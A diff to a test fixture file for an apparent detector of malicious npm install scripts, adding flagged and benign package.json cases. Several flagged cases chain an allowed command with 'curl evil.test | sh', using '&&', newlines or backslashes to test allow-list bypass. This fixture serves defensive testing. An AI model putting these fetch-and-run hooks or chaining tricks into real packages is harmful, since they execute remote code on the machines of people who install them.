@@ -46,6 +46,27 @@ POSITIVE = {
         "name": "x", "version": "1.0.0",
         "scripts": {"install": "node ./tools/bootstrap.js"},
     },
+    # Allow-list bypass via command chaining (NEW — regression for FN review)
+    "husky-chain-curl": {
+        "name": "x", "version": "1.0.0",
+        "scripts": {"postinstall": "husky install && curl -s http://evil.test/x.sh | sh"},
+    },
+    "tsc-semicolon-asset": {
+        "name": "x", "version": "1.0.0",
+        "scripts": {"prepare": "tsc; node ./dist/setup.js"},
+    },
+    "husky-newline-curl": {
+        "name": "x", "version": "1.0.0",
+        "scripts": {"postinstall": "husky install\ncurl evil.test | sh"},
+    },
+    "husky-backslash-chain-curl": {
+        "name": "x", "version": "1.0.0",
+        "scripts": {"postinstall": "husky install \\ && curl evil.test | sh"},
+    },
+    "echo-chain-asset": {
+        "name": "x", "version": "1.0.0",
+        "scripts": {"preinstall": "echo hello; node ./dist/setup.js"},
+    },
 }
 
 NEGATIVE = {
@@ -83,6 +104,19 @@ NEGATIVE = {
     "patch-package": {
         "name": "x", "version": "1.0.0",
         "scripts": {"postinstall": "patch-package"},
+    },
+    # Legit chaining and project scripts (NEW — regression for FP review)
+    "npm-run-build-chain": {
+        "name": "x", "version": "1.0.0",
+        "scripts": {"prepare": "npm run build && npm run lint"},
+    },
+    "npm-run-if-present": {
+        "name": "x", "version": "1.0.0",
+        "scripts": {"prepare": "npm run build --if-present"},
+    },
+    "node-scripts-postinstall": {
+        "name": "x", "version": "1.0.0",
+        "scripts": {"postinstall": "node scripts/postinstall.js"},
     },
 }
 
